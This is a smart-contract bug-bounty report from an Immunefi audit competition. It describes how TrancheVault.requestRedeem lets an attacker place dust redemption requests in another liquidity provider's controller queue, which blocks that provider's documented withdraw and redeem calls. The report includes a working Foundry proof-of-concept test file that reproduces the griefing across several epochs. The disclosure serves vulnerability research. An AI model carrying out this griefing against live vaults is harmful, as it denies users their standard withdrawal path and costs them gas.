# \#99586 [SC-Low] A third-party dust redemption blocks another LP's documented withdrawal path

**Submitted on Nov 14th 2026 at 11:34:16 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99586
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
`TrancheVault.requestRedeem` lets a share owner name any controller without that controller's consent. An attacker can use a near-worthless share balance to put a refundable request at another LP's controller queue head. The LP's later redemption can be fully funded, yet the documented `withdraw` and `redeem` claim calls still select the attacker's dust request and revert. The LP's USDG remains claimable through `claimRedeem(requestId, ...)`; the issue is denial of the standard claim path

## Vulnerability Details
Plether's [canonical LP instructions](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L189-L192) tell holders to request an exit and claim a funded redemption through ERC-4626 `redeem` or `withdraw`. Neither call accepts a request ID. Both select `controllerRedeemHead[controller]` ([TrancheVault.sol, lines 998–1021](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1021)).

The attacker needs only their own aged vault shares. They do not need the victim's approval or shares:

1. `requestRedeem(shares, controller, owner)` checks that the caller can spend `owner`'s shares, but does not check whether `controller` agreed to receive the request ([lines 606–632](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632)). The attacker calls it with `owner = attacker` and `controller = victim`. `_enqueueRedeemRequest` adds the epoch to the victim's controller queue ([lines 688–708](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L688-L708)).
2. The PoC uses the attacker's entire 999-share-atom balance. The full-balance exception lets this dust request pass the minimum redemption size check. In an otherwise empty epoch, its USDG quote rounds to zero. Settlement makes the shares refundable and advances the global epoch queue ([HousePool.sol, lines 944–987](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L944-L987)). The victim's separate controller queue still has the dust request at its head.
3. The victim submits a real redemption in a later epoch, and the pool funds it. `maxWithdraw(victim)` and `maxRedeem(victim)` nevertheless return zero because they inspect only the refundable dust head ([TrancheVault.sol, lines 1299–1311](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311)). Calling `withdraw` or `redeem` for the funded amount reverts. The failed call does not remove the dust or advance to the victim's request, so repeating it produces the same result.

One dust head can keep the no-ID claim calls unusable until the victim clears it. The attacker can add more heads in separate epochs, including before any cleanup. Multiple requests in one epoch merge into one position, so separate epochs matter for repetition.

The zero-quote and refund rules are discussed in [`SECURITY.md`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1403-L1414). The separate failure here is that `requestRedeem` lets an unrelated share owner attach one of those positions to the victim's controller queue. The published dust limitations do not describe that unconsented nomination.


## Impact Details
The [impact table](https://immunefi.com/audit-competition/plether/scope/) places griefing that damages users or the protocol under Medium. Here, an unprivileged attacker prevents another LP from using Plether's documented claim calls for a funded exit. A client that reads `maxWithdraw` before sending a transaction sees zero even though a later request is funded. If it sends `withdraw` or `redeem` anyway, each failed transaction costs the LP gas; repeated attempts continue to revert. To that LP the vault appears unable to pay through its documented flow, creating avoidable recovery and support work. A frontend that exposes only those no-ID calls would leave the user unable to claim through that interface.

The victim has two recovery paths:

- `claimRedeem(realRequestId, ...)` pays the funded USDG in one claim transaction, but it is not the claim path described in Plether's LP instructions. The victim must find the request ID in a transaction event or the public controller queue, then call a different function. Someone who knows to do this can avoid an extra transaction. An LP following the documented `withdraw`/`redeem` flow is more likely to encounter the blocked call first, and recovering the ID and making a custom contract call is substantial extra work for a user relying on the standard interface.
- `claimRedeemRefund(dustRequestId, victim, victim)` removes a refundable dust head and gives the attacker-funded shares to the victim. The victim can then use standard `withdraw` or `redeem` for the already funded request. Clearing each head takes an extra transaction and starts a one-hour cooldown on **new** redemption requests; it does not delay claiming USDG that is already funded. The attacker cannot trigger that cooldown on the victim's behalf.

The documented withdrawal path can therefore fail persistently and impose manual recovery work or wasted gas. The USDG remains available through `claimRedeem`; the attacker cannot impose a one-hour fund lock or force a gas-spending transaction on a user who checks the zero maximum and claims by ID directly.



## Proof of Concept

## Proof of Concept

Attach the single file `ControllerQueueGriefPoC.t.sol` and place it at `packages/perps/test/poc/ControllerQueueGriefPoC.t.sol` in the competition repository. Run from the repository root:

```bash
forge test --root packages/perps --offline --match-path test/poc/ControllerQueueGriefPoC.t.sol --out out-controller-queue-grief-poc --cache-path cache-controller-queue-grief-poc -vv
```

The PoC uses the repository's `BasePerpTest` fixture and does not modify any contract in scope. At the pinned commit, all three tests passed:

```text
[PASS] test_ClearingDustRestoresWithdrawButStartsNewRequestCooldown()
[PASS] test_DocumentedClaimsKeepRevertingButIdClaimPaysInFull()
[PASS] test_ThreeSeparateDustHeadsStillBlockNoIdClaims()
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

`test_DocumentedClaimsKeepRevertingButIdClaimPaysInFull` proves that two `withdraw` attempts and a `redeem` attempt revert while the victim's later request remains fully claimable by ID. `test_ClearingDustRestoresWithdrawButStartsNewRequestCooldown` clears the dust, claims the funded withdrawal immediately through `withdraw`, and shows the cooldown applies to new requests. The remaining test repeats the dust attack across three distinct epochs.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";

/// @notice Reproduces third-party redemption requests blocking another controller's no-ID claims.
contract ControllerQueueGriefPoCTest is BasePerpTest {
    address internal constant DONOR = address(0xD0A0);
    address internal constant MALLORY = address(0xBAD);
    address internal constant ALICE = address(0xA11CE);

    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }

    function _afterCooldown(address account) internal {
        uint256 ready = seniorVault.lastDepositTime(account) + seniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < ready) vm.warp(ready);
    }

    function _settleAt(uint256 requestId) internal {
        vm.warp(pool.lpEpochStart(requestId));
        uint256 mark = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(mark == 0 ? 1e8 : mark, uint64(block.timestamp));
        _settleLpEpochForTest();
    }

    function _setupDustHead() internal returns (uint256 dustId) {
        _fundSenior(DONOR, 100_000e6);
        _fundSenior(ALICE, 10_000e6);
        _afterCooldown(DONOR);
        _afterCooldown(ALICE);

        // Mallory owns the shares; Alice has neither approved nor interacted with Mallory.
        vm.prank(DONOR);
        seniorVault.transfer(MALLORY, 999);
        vm.warp((block.timestamp / 1 hours + 1) * 1 hours + 60);
        vm.prank(MALLORY);
        dustId = seniorVault.requestRedeem(999, ALICE, MALLORY);
        _settleAt(dustId);

        assertTrue(seniorVault.redeemRefundPending(dustId, ALICE));
        assertEq(seniorVault.refundableRedeemRequest(dustId, ALICE), 999);
        assertEq(seniorVault.controllerRedeemHead(ALICE), dustId);
    }

    function _fundAliceRequest(uint256 dustId)
        internal
        returns (uint256 realId, uint256 claimableShares, uint256 claimableAssets)
    {
        uint256 aliceShares = seniorVault.balanceOf(ALICE);
        assertEq(seniorVault.maxRequestRedeem(ALICE), aliceShares);
        vm.warp(block.timestamp + 60);
        vm.prank(ALICE);
        realId = seniorVault.requestRedeem(aliceShares, ALICE, ALICE);
        assertGt(realId, dustId);
        _settleAt(realId);
        claimableShares = seniorVault.claimableRedeemRequest(realId, ALICE);
        claimableAssets = seniorVault.claimableRedeemAssets(realId, ALICE);
        assertGt(claimableAssets, 1_000e6);
    }

    function test_DocumentedClaimsKeepRevertingButIdClaimPaysInFull() public {
        uint256 dustId = _setupDustHead();
        (uint256 realId, uint256 shares, uint256 assets) = _fundAliceRequest(dustId);

        assertEq(seniorVault.controllerRedeemHead(ALICE), dustId);
        assertEq(seniorVault.maxWithdraw(ALICE), 0);
        assertEq(seniorVault.maxRedeem(ALICE), 0);

        vm.startPrank(ALICE);
        vm.expectRevert();
        seniorVault.withdraw(assets, ALICE, ALICE);
        vm.expectRevert();
        seniorVault.withdraw(assets, ALICE, ALICE);
        vm.expectRevert();
        seniorVault.redeem(shares, ALICE, ALICE);
        vm.stopPrank();

        assertEq(seniorVault.controllerRedeemHead(ALICE), dustId);
        assertEq(seniorVault.claimableRedeemAssets(realId, ALICE), assets);
        uint256 beforeAssets = settlementToken.balanceOf(ALICE);
        vm.prank(ALICE);
        assertEq(seniorVault.claimRedeem(realId, shares, ALICE, ALICE), assets);
        assertEq(settlementToken.balanceOf(ALICE) - beforeAssets, assets);
    }

    function test_ClearingDustRestoresWithdrawButStartsNewRequestCooldown() public {
        uint256 dustId = _setupDustHead();
        (uint256 realId,, uint256 assets) = _fundAliceRequest(dustId);

        vm.prank(ALICE);
        assertEq(seniorVault.claimRedeemRefund(dustId, ALICE, ALICE), 999);
        assertEq(seniorVault.controllerRedeemHead(ALICE), realId);
        assertEq(seniorVault.maxWithdraw(ALICE), assets);
        assertEq(seniorVault.maxRequestRedeem(ALICE), 0);

        // The cooldown limits new requests; it does not delay this already-funded claim.
        uint256 beforeAssets = settlementToken.balanceOf(ALICE);
        vm.prank(ALICE);
        seniorVault.withdraw(assets, ALICE, ALICE);
        assertEq(settlementToken.balanceOf(ALICE) - beforeAssets, assets);

        vm.warp(block.timestamp + seniorVault.DEPOSIT_COOLDOWN());
        assertEq(seniorVault.maxRequestRedeem(ALICE), 999);
    }

    function test_ThreeSeparateDustHeadsStillBlockNoIdClaims() public {
        uint256 firstDustId = _setupDustHead();
        uint256 previousDustId = firstDustId;
        for (uint256 i; i < 2; ++i) {
            vm.prank(DONOR);
            seniorVault.transfer(MALLORY, 999);
            vm.warp(pool.lpEpochStart(previousDustId) + 1 hours + 60);
            vm.prank(MALLORY);
            uint256 nextDustId = seniorVault.requestRedeem(999, ALICE, MALLORY);
            assertGt(nextDustId, previousDustId);
            previousDustId = nextDustId;
        }
        _settleAt(previousDustId);
        assertTrue(seniorVault.redeemRefundPending(previousDustId, ALICE));

        (uint256 realId, uint256 shares, uint256 assets) = _fundAliceRequest(firstDustId);
        assertEq(seniorVault.controllerRedeemHead(ALICE), firstDustId);
        assertEq(seniorVault.maxWithdraw(ALICE), 0);
        vm.prank(ALICE);
        vm.expectRevert();
        seniorVault.withdraw(assets, ALICE, ALICE);
        vm.prank(ALICE);
        assertEq(seniorVault.claimRedeem(realId, shares, ALICE, ALICE), assets);
    }
}

```
